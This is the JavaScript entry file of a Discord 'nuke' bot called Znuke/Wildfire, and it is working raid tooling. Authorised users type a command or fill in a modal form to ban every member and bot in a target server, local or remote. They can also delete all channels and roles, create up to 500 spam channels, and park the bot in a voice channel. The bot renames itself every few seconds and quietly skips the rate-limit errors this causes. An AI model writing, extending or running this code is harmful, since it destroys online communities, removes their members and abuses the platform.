// src/index.js — Bot entry point
//
// Usage:
//   znuke                 → full nuke current server (ban all + create VC)
//   znuke <server_id>     → full nuke remote server
//   znuke manager         → open Znuke Manager (single modal, all options)

import 'dotenv/config';
import {
  Client,
  GatewayIntentBits,
  Events,
  Partials,
  EmbedBuilder,
  ActionRowBuilder,
  ButtonBuilder,
  ButtonStyle,
  ModalBuilder,
  TextInputBuilder,
  TextInputStyle,
  ChannelType,
} from 'discord.js';
import {
  joinVoiceChannel,
  VoiceConnectionStatus,
  entersState,
} from '@discordjs/voice';
import { nukeServer, buildNukeEmbed, buildVcNukeEmbed } from './commands/nuke.js';

// ─── Owner whitelist ───────────────────────────────────────────────────────────
const ALLOWED_IDS = new Set(
  (process.env.OWNER_IDS ?? '')
    .split(',')
    .map((id) => id.trim())
    .filter(Boolean),
);

const PREFIX = 'znuke';

// ─── Deduplication guard ───────────────────────────────────────────────────────
const handledMessages = new Set();

// ─── Active voice connections (guildId → VoiceConnection) ─────────────────────
const activeVoiceConnections = new Map();

// ─── Helper: join a VC and never leave until kicked ───────────────────────────
// On a network blip, the connection auto-reconnects.
// If the bot is kicked / channel deleted, the connection is destroyed cleanly.
async function joinAndStay(vcChannel, guild) {
  // Kill any existing connection for this guild
  const existing = activeVoiceConnections.get(guild.id);
  if (existing) {
    try { existing.destroy(); } catch { /* ignore */ }
    activeVoiceConnections.delete(guild.id);
  }

  const connection = joinVoiceChannel({
    channelId:      vcChannel.id,
    guildId:        guild.id,
    adapterCreator: guild.voiceAdapterCreator,
    selfDeaf:       true,
    selfMute:       true,
  });

  activeVoiceConnections.set(guild.id, connection);

  // When disconnected, try to detect if it's a network blip or a real kick
  connection.on(VoiceConnectionStatus.Disconnected, async () => {
    try {
      // If the connection enters Signalling/Connecting within 5 s it is auto-reconnecting
      await Promise.race([
        entersState(connection, VoiceConnectionStatus.Signalling,  5_000),
        entersState(connection, VoiceConnectionStatus.Connecting,  5_000),
      ]);
      // Reconnecting — nothing to do
    } catch {
      // Could not reconnect — bot was kicked or channel was deleted → clean up
      if (connection.state.status !== VoiceConnectionStatus.Destroyed) {
        connection.destroy();
      }
      activeVoiceConnections.delete(guild.id);
    }
  });

  connection.on(VoiceConnectionStatus.Destroyed, () => {
    activeVoiceConnections.delete(guild.id);
  });

  return connection;
}

// ─── Client ───────────────────────────────────────────────────────────────────
const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.DirectMessages,
    GatewayIntentBits.GuildVoiceStates,   // required for @discordjs/voice
  ],
  partials: [Partials.Channel],
});

// ─── Global error guard ────────────────────────────────────────────────────────
client.on('error', (err) => console.error('[client error]', err.message));
process.on('unhandledRejection', (err) => console.error('[unhandledRejection]', err?.message ?? err));

// ─── Helper: send safely (channel may be deleted after nuke) ──────────────────
async function safeSend(channel, user, payload) {
  try {
    await channel.send(payload);
  } catch {
    try {
      const dm = await user.createDM();
      await dm.send(payload);
    } catch (dmErr) {
      console.warn('[safeSend] Could not DM user either:', dmErr.message);
    }
  }
}

// ─── Helper: open the Znuke Manager single-button embed ───────────────────────
async function sendManagerEmbed(channel) {
  const embed = new EmbedBuilder()
    .setColor(0xff3c3c)
    .setTitle('🗡️ Znuke Manager')
    .setDescription(
      [
        '> Advanced nuke control panel.',
        '',
        '**Modes:**',
        '`1` — **Chan & Role** — Create spam channels + delete all roles',
        '`2` — **Ban All** — Ban every member & bot in the server',
        '`3` — **Wipe All** — Delete everything + ban all + create spam channels',
        '',
        '**VC Mode:** Append `v` to the channel count to create a Voice Channel at the top.',
        '> `100v` → 1 VC + 99 text channels · `1v` → 1 VC only',
        '> Bot joins the VC immediately and stays until kicked.',
        '',
        '> Click **Launch Manager** to open the control panel.',
      ].join('\n'),
    )
    .setFooter({ text: 'Only authorised users can interact with this panel.' })
    .setTimestamp();

  const row = new ActionRowBuilder().addComponents(
    new ButtonBuilder()
      .setCustomId('manager_open')
      .setLabel('⚙️ Launch Manager')
      .setStyle(ButtonStyle.Danger),
  );

  await channel.send({ embeds: [embed], components: [row] });
}

// ─── Ready ────────────────────────────────────────────────────────────────────
client.once(Events.ClientReady, (c) => {
  console.log(`\n✅  Logged in as ${c.user.tag}`);
  console.log(`📡  Watching ${c.guilds.cache.size} guild(s)`);
  console.log(`☢️   znuke command is active`);
  console.log(`👑  Authorised users: ${[...ALLOWED_IDS].join(', ') || 'NONE SET'}\n`);

  // ─── Rotating watching status ─────────────────────────────────────────────
  const watchStatuses = [
    'Wildfire | Armed',
    'Wildfire | Wreckage',
    'Wildfire | Devastation',
    'Wildfire | Chaos',
    'Wildfire | Collapse',
    'Wildfire | Ur Fxther',
  ];
  let watchIndex = 0;

  const setWatchStatus = () => {
    c.user.setPresence({
      activities: [{ name: watchStatuses[watchIndex], type: 3 }], // 3 = Watching
      status: 'dnd',
    });
    watchIndex = (watchIndex + 1) % watchStatuses.length;
  };
  setWatchStatus();
  setInterval(setWatchStatus, 5_000);

  // ─── Rotating bot username ─────────────────────────────────────────────────
  // Discord allows ~2 renames/hour. We attempt every 5 s and silently skip
  // the cycle when rate-limited so the bot never crashes.
  const botNames = [
    'Wildfire | Armed',
    'Wildfire | Wreckage',
    'Wildfire | Devastation',
    'Wildfire | Chaos',
    'Wildfire | Collapse',
    'Wildfire | Ur Fxther',
  ];
  let nameIndex = 0;

  setInterval(async () => {
    try {
      await c.user.setUsername(botNames[nameIndex]);
      nameIndex = (nameIndex + 1) % botNames.length;
    } catch {
      // Rate-limited or API error — skip this cycle silently
    }
  }, 5_000);
});

// ─── Message handler ──────────────────────────────────────────────────────────
client.on(Events.MessageCreate, async (message) => {
  // Ignore bots
  if (message.author.bot) return;

  const content = message.content.trim();

  // Must start with "znuke" (case-insensitive)
  if (!content.toLowerCase().startsWith(PREFIX)) return;

  // ── Deduplication ─────────────────────────────────────────────────────────
  if (handledMessages.has(message.id)) return;
  handledMessages.add(message.id);
  setTimeout(() => handledMessages.delete(message.id), 60_000);

  // ── Authorisation check ───────────────────────────────────────────────────
  if (!ALLOWED_IDS.has(message.author.id)) {
    return message.reply({
      embeds: [
        new EmbedBuilder()
          .setColor(0xff3c3c)
          .setTitle('🚫 Access Denied')
          .setDescription('You are **not authorised** to use this command.')
          .setTimestamp(),
      ],
    }).catch(() => {});
  }

  // ── Parse arguments ───────────────────────────────────────────────────────
  const args      = content.slice(PREFIX.length).trim().split(/\s+/).filter(Boolean);
  const isManager = args[0]?.toLowerCase() === 'manager';

  // ── znuke manager — show the embed with one button ────────────────────────
  if (isManager) {
    return sendManagerEmbed(message.channel).catch(() => {});
  }

  // ── znuke / znuke <server_id> — direct full nuke ──────────────────────────
  const serverIdArg = args[0];
  const targetId    = serverIdArg ?? message.guild?.id;

  if (!targetId) {
    return message.reply(
      '❌ Provide a server ID when using this in DMs.\n`znuke <server_id>`',
    ).catch(() => {});
  }

  let targetGuild;
  try {
    targetGuild = await client.guilds.fetch(targetId);
  } catch {
    return message.reply(
      `❌ Cannot reach server \`${targetId}\`.\nThe bot must be a member of that server.`,
    ).catch(() => {});
  }

  const isRemote      = targetId !== message.guild?.id;
  const reportChannel = message.channel;
  const invoker       = message.author;

  // Confirmation prompt
  await message.reply({
    embeds: [
      new EmbedBuilder()
        .setColor(0xff3c3c)
        .setTitle('⚠️ Confirm Nuke')
        .setDescription(
          [
            `**Target:** ${targetGuild.name} (\`${targetGuild.id}\`)`,
            `**Action:** 🔨 Ban All (members + bots) + 🔊 VC creation`,
            isRemote ? '> 🌐 **Remote nuke**' : '> 🏠 **Local nuke**',
            '',
            'Type **`confirm`** within 30 seconds to proceed.',
          ].join('\n'),
        )
        .setTimestamp(),
    ],
  }).catch(() => {});

  const filter = (m) =>
    m.author.id === invoker.id && m.content.toLowerCase() === 'confirm';

  try {
    await message.channel.awaitMessages({ filter, max: 1, time: 30_000, errors: ['time'] });
  } catch {
    return message.channel.send('✅ Nuke cancelled — timed out. No action taken.').catch(() => {});
  }

  await safeSend(reportChannel, invoker, {
    embeds: [
      new EmbedBuilder()
        .setColor(0xff3c3c)
        .setTitle('☢️ Nuke In Progress…')
        .setDescription(`🔴 Wiping **${targetGuild.name}**…`)
        .setTimestamp(),
    ],
  });

  try {
    // Direct znuke always creates a VC (count=0 → only VC, no spam text channels)
    const { log, vcChannel } = await nukeServer(
      targetGuild, client.user.id, 0, 'nuked', true, 'wildfire-base',
    );

    // Join the VC and stay
    if (vcChannel) {
      joinAndStay(vcChannel, targetGuild).catch(() => {});
    }

    const resultEmbed = new EmbedBuilder()
      .setColor(0x2b2d31)
      .setTitle('💀 Nuke Complete')
      .setDescription(log.join('\n'))
      .setFooter({ text: `${targetGuild.name} (${targetGuild.id})` })
      .setTimestamp();

    await safeSend(reportChannel, invoker, { embeds: [resultEmbed] });

    try {
      const dm = await invoker.createDM();
      await dm.send({
        embeds: [
          new EmbedBuilder()
            .setColor(0xff0000)
            .setTitle('📋 Nuke Report — DM Copy')
            .setDescription(log.join('\n'))
            .addFields(
              { name: 'Target Server', value: `${targetGuild.name} (\`${targetGuild.id}\`)`, inline: false },
              { name: 'Type',          value: isRemote ? '🌐 Remote' : '🏠 Local',            inline: true  },
              { name: 'Executed By',   value: `<@${invoker.id}>`,                              inline: true  },
            )
            .setFooter({ text: 'WildfireX Security' })
            .setTimestamp(),
        ],
      });
    } catch { /* DM closed */ }
  } catch (err) {
    console.error('[znuke] Unexpected error:', err.message);
    await safeSend(reportChannel, invoker, `❌ Nuke error: \`${err.message}\``);
  }
});

// ─── Interaction handler (button + modal) ─────────────────────────────────────
client.on(Events.InteractionCreate, async (interaction) => {

  // ── Auth check ────────────────────────────────────────────────────────────
  if (!ALLOWED_IDS.has(interaction.user.id)) {
    return interaction.reply({
      embeds: [
        new EmbedBuilder()
          .setColor(0xff3c3c)
          .setTitle('🚫 Access Denied')
          .setDescription('You are **not authorised** to use this.'),
      ],
      ephemeral: true,
    }).catch(() => {});
  }

  const guild = interaction.guild;
  if (!guild) {
    return interaction.reply({
      content: '❌ Must be used inside a server.',
      ephemeral: true,
    }).catch(() => {});
  }

  // ─────────────────────────────────────────────────────────────────────────
  // BUTTON: Launch Manager → open the unified modal
  // ─────────────────────────────────────────────────────────────────────────
  if (interaction.isButton() && interaction.customId === 'manager_open') {
    const modal = new ModalBuilder()
      .setCustomId('modal_manager')
      .setTitle('Znuke Manager');

    modal.addComponents(
      // Field 1: Server ID (optional)
      new ActionRowBuilder().addComponents(
        new TextInputBuilder()
          .setCustomId('server_id')
          .setLabel('Server ID (blank = current server)')
          .setStyle(TextInputStyle.Short)
          .setRequired(false),
      ),
      // Field 2: Mode
      new ActionRowBuilder().addComponents(
        new TextInputBuilder()
          .setCustomId('mode')
          .setLabel('Mode (1=Chan&Role, 2=BanAll, 3=WipeAll)')
          .setStyle(TextInputStyle.Short)
          .setRequired(true),
      ),
      // Field 3: Channels — append 'v' for VC (e.g. 100v, 1v)
      new ActionRowBuilder().addComponents(
        new TextInputBuilder()
          .setCustomId('channels_count')
          .setLabel('Channels (add v for VC: 100v · 1v=VC only)')
          .setStyle(TextInputStyle.Short)
          .setRequired(true),
      ),
      // Field 4: Channel Name
      new ActionRowBuilder().addComponents(
        new TextInputBuilder()
          .setCustomId('channel_name')
          .setLabel('Channel Name')
          .setStyle(TextInputStyle.Short)
          .setRequired(true),
      ),
      // Field 5: CONFIRM
      new ActionRowBuilder().addComponents(
        new TextInputBuilder()
          .setCustomId('confirm')
          .setLabel('Type CONFIRM to proceed')
          .setStyle(TextInputStyle.Short)
          .setPlaceholder('CONFIRM')
          .setRequired(true),
      ),
    );

    return interaction.showModal(modal).catch(() => {});
  }

  // ─────────────────────────────────────────────────────────────────────────
  // MODAL SUBMIT: Znuke Manager — execute everything at once
  // ─────────────────────────────────────────────────────────────────────────
  if (interaction.isModalSubmit() && interaction.customId === 'modal_manager') {
    const confirmVal = interaction.fields.getTextInputValue('confirm').trim().toUpperCase();
    if (confirmVal !== 'CONFIRM') {
      return interaction.reply({
        content: '❌ Cancelled — you did not type CONFIRM.',
        ephemeral: true,
      }).catch(() => {});
    }

    const serverIdInput = interaction.fields.getTextInputValue('server_id').trim();
    const mode          = interaction.fields.getTextInputValue('mode').trim();
    const rawCount      = interaction.fields.getTextInputValue('channels_count').trim().toLowerCase();
    const channelName   = interaction.fields.getTextInputValue('channel_name').trim() || 'nuked';

    // Parse VC toggle: 'v' suffix → e.g. "100v" → count=100, createVc=true
    // parseInt('100v', 10) === 100  (stops at first non-digit — intentional)
    const createVc  = rawCount.endsWith('v');
    const count     = Math.min(Math.max(parseInt(rawCount, 10) || 0, 0), 500);
    // Text channels = count − 1 (VC takes 1 slot); 0 if only 1 slot requested
    const textCount = createVc ? Math.max(count - 1, 0) : count;

    // Validate mode
    if (!['1', '2', '3'].includes(mode)) {
      return interaction.reply({
        content: '❌ Invalid mode. Enter `1`, `2`, or `3`.',
        ephemeral: true,
      }).catch(() => {});
    }

    // ── Resolve target guild ───────────────────────────────────────────────
    let targetGuild = guild;
    let isRemote    = false;

    if (serverIdInput && serverIdInput !== guild.id) {
      try {
        targetGuild = await client.guilds.fetch(serverIdInput);
        isRemote = true;
      } catch {
        return interaction.reply({
          content: `❌ Cannot reach server \`${serverIdInput}\`.\nThe bot must be a member of that server.`,
          ephemeral: true,
        }).catch(() => {});
      }
    }

    const modeLabel = mode === '1' ? 'Chan & Role' : mode === '2' ? 'Ban All' : 'Wipe All';

    // Acknowledge immediately
    await interaction.reply({
      embeds: [
        new EmbedBuilder()
          .setColor(0xff3c3c)
          .setTitle('☢️ Executing…')
          .setDescription(
            [
              `**Target:** ${targetGuild.name} (\`${targetGuild.id}\`)`,
              isRemote ? '> 🌐 **Remote nuke**' : '> 🏠 **Local nuke**',
              `**Mode:** \`${modeLabel}\``,
              mode !== '2'
                ? `**Channels:** \`${count}\`${createVc ? ' (1 VC + ' + textCount + ' text)' : ''} × \`${channelName}\``
                : '',
              createVc ? '🔊 **VC:** Bot will join and hold position.' : '',
              '> Running all tasks simultaneously…',
            ].filter(Boolean).join('\n'),
          )
          .setTimestamp(),
      ],
      ephemeral: true,
    }).catch(() => {});

    const log = [];
    let vcChannel = null;

    try {
      // ── MODE 1: Chan & Role ──────────────────────────────────────────────
      if (mode === '1') {
        // A — wipe existing channels
        const existingChs = targetGuild.channels.cache.map((ch) => ch.delete().catch(() => {}));
        const delResults  = await Promise.allSettled(existingChs);
        const delOk       = delResults.filter((r) => r.status === 'fulfilled').length;
        log.push(`🗑️ **Old Channels Wiped** — \`${delOk}\` deleted`);

        // B — create VC first if requested (position 0 = top)
        if (createVc) {
          try {
            vcChannel = await targetGuild.channels.create({
              name:     channelName,
              type:     ChannelType.GuildVoice,
              position: 0,
            });
            await vcChannel.setPosition(0, { relative: false }).catch(() => {});
            await vcChannel.send({ embeds: [buildVcNukeEmbed()] }).catch(() => {});
            log.push(`🔊 **Voice Channel** — \`${vcChannel.name}\` created at top`);
          } catch (err) {
            log.push(`🔊 **Voice Channel** — failed: \`${err.message}\``);
          }
        }

        // C — create spam text channels + delete roles (parallel)
        const parallelTasks = [];

        if (textCount > 0) {
          parallelTasks.push(
            (async () => {
              const tasks = Array.from({ length: textCount }, async () => {
                try {
                  const ch = await targetGuild.channels.create({ name: channelName });
                  if (ch && typeof ch.send === 'function') {
                    await ch.send({ embeds: [buildNukeEmbed(channelName)] }).catch(() => {});
                  }
                } catch { /* ignore */ }
              });
              const results = await Promise.allSettled(tasks);
              const ok      = results.filter((r) => r.status === 'fulfilled').length;
              return `📣 **Channels Created** — \`${ok}\` created (\`${channelName}\`)`;
            })(),
          );
        }

        parallelTasks.push(
          (async () => {
            const botMember  = await targetGuild.members.fetch(client.user.id);
            const botTopRole = botMember.roles.highest.position;
            const roles      = targetGuild.roles.cache.filter(
              (r) => r.id !== targetGuild.id && r.position < botTopRole,
            );
            const roleTasks = roles.map((r) => r.delete().catch(() => {}));
            const results   = await Promise.allSettled(roleTasks);
            const ok        = results.filter((r) => r.status === 'fulfilled').length;
            return `🎭 **Roles Deleted** — \`${ok}\` deleted`;
          })(),
        );

        const settled = await Promise.allSettled(parallelTasks);
        settled.forEach((r) => {
          if (r.status === 'fulfilled') log.push(r.value);
          else log.push(`❌ Task failed: \`${r.reason?.message}\``);
        });
      }

      // ── MODE 2: Ban All ──────────────────────────────────────────────────
      if (mode === '2') {
        await targetGuild.members.fetch().catch(() => {});
        const members = targetGuild.members.cache.filter((m) => m.id !== client.user.id);
        const results = await Promise.allSettled(
          members.map((m) => m.ban({ reason: 'Znuke Manager — Ban All' }).catch(() => {})),
        );
        const ok = results.filter((r) => r.status === 'fulfilled').length;
        log.push(`🔨 **Members Banned** — \`${ok}\` banned (including bots)`);

        // Create VC after banning if requested
        if (createVc) {
          try {
            vcChannel = await targetGuild.channels.create({
              name:     channelName,
              type:     ChannelType.GuildVoice,
              position: 0,
            });
            await vcChannel.setPosition(0, { relative: false }).catch(() => {});
            await vcChannel.send({ embeds: [buildVcNukeEmbed()] }).catch(() => {});
            log.push(`🔊 **Voice Channel** — \`${vcChannel.name}\` created`);
          } catch (err) {
            log.push(`🔊 **Voice Channel** — failed: \`${err.message}\``);
          }
        }
      }

      // ── MODE 3: Wipe All ─────────────────────────────────────────────────
      if (mode === '3') {
        const result = await nukeServer(
          targetGuild, client.user.id, count, channelName, createVc, channelName,
        );
        log.push(...result.log);
        vcChannel = result.vcChannel;
      }

    } catch (err) {
      console.error('[manager modal] Error:', err.message);
      log.push(`❌ Error: \`${err.message}\``);
    }

    // ── Join VC if one was created ─────────────────────────────────────────
    if (vcChannel) {
      joinAndStay(vcChannel, targetGuild).catch(() => {});
    }

    await interaction.followUp({
      embeds: [
        new EmbedBuilder()
          .setColor(0x2b2d31)
          .setTitle('💀 Done')
          .setDescription(log.join('\n') || 'No actions were performed.')
          .setFooter({ text: `${targetGuild.name} (${targetGuild.id}) · Mode ${mode} (${modeLabel})` })
          .setTimestamp(),
      ],
      ephemeral: true,
    }).catch(() => {});

    // ── DM the invoker with full report ───────────────────────────────────
    try {
      const dm = await interaction.user.createDM();
      await dm.send({
        embeds: [
          new EmbedBuilder()
            .setColor(0xff0000)
            .setTitle('📋 Nuke Report — DM Copy')
            .setDescription(log.join('\n') || 'No actions were performed.')
            .addFields(
              { name: 'Target Server', value: `${targetGuild.name} (\`${targetGuild.id}\`)`,       inline: false },
              { name: 'Mode',          value: `${mode} — ${modeLabel}`,                              inline: true  },
              { name: 'Type',          value: isRemote ? '🌐 Remote' : '🏠 Local',                  inline: true  },
              { name: 'Executed By',   value: `<@${interaction.user.id}> (${interaction.user.tag})`, inline: false },
            )
            .setFooter({ text: 'WildfireX Security' })
            .setTimestamp(),
        ],
      });
    } catch { /* DMs closed or blocked */ }
  }
});

// ─── Login ────────────────────────────────────────────────────────────────────
client.login(process.env.BOT_TOKEN);
